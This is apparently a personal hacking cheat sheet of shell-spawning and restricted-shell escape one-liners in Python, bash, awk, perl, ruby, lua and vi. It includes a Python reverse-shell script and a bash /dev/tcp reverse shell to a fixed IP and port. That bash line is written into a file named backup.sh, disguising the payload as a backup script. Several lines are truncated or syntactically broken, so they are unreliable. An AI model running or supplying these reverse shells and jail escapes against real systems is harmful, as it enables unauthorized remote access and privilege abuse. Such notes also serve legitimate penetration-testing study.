---
tags: 🔻 🔻/shell
aliases: Hacking Notes
---

# Pseudo shell


The pty module let's you spawn a psuedo-terminal that can fool commands like su into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command:

## Python
#Python 

python -c 'import pty;pty.spawn("/bin/bash")'  
  
echo os.system('/bin/bash')  
  
/bin/sh -i 
  

### Spawning a TTY Shell - Break out of Jail or limited shell
  

python -c 'import pty; pty.spawn("/bin/bash")'  
PS1='\\e\[33;1m\\u@\\h: \\e\[31m\\W\\e\[0m\\$  


#!/usr/bin/python  
import socket,subprocess,os  
s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM)  
s.connect(('x.x.x.x  
os.dup2(s.fileno(),0)  
os.dup2(s.fileno(),1)  
os.dup2(s.fileno(),2)  
p=subprocess.call(\["/bin/sh","-i"\])  



python: exit\_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()  

# Bash


echo "#!/bin/bash" > backup.sh;echo "bash -i >& /dev/tcp/10.11.13.142/5555 0>&1" >> backup.sh


#bash_shell

bash -i >& /dev/tcp/x.x.x.x  

echo os.system('/bin/bash')  

\`/bin/sh -i\`  

:! /bin/bash



# awk
#awk_shell

awk 'BEGIN {system("/bin/sh")}'  


find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \\;

# perl
#perl_shell

perl -e 'exec "/bin/bash";'  

perl: exec "/bin/sh";

# ruby
#ruby_shell

ruby: exec "/bin/sh"

# lua
#lua_shell

lua: os.execute('/bin/sh')  
  
lua: \`os.execute('/bin/sh')\`

# vi
#vim/vi_shell

open vi or vim and type:


## from vi

:set shell=/bin/bash  
Next, type and execute  
:shell  
  

## from vim



\`':!bash':\`



## from vi
\`:!bash\`